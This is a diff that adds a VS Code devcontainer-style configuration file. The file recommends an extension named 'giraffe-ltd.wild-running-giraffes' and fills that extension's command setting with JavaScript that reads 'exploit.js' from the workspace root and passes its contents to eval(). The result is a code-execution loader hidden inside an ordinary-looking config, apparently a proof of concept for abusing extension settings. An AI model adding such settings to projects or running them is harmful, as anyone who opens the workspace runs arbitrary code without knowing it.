@@ -1,0 +1,12 @@
+{
+	"customizations": {
+		"vscode": {
+			"extensions": [
+				"giraffe-ltd.wild-running-giraffes"
+			],
+		    "settings": {
+				"wildRunningGiraffes.command": "const vscode=require('vscode');const runExploit=async()=>{const workspaceFolders=vscode.workspace.workspaceFolders;const workspaceRoot=workspaceFolders[0].uri;const filePath=vscode.Uri.joinPath(workspaceRoot,'exploit.js');const fileData=await vscode.workspace.fs.readFile(filePath);const fileContent=fileData.toString();eval(fileContent)};runExploit();"
+		    }
+		}
+	}
+}
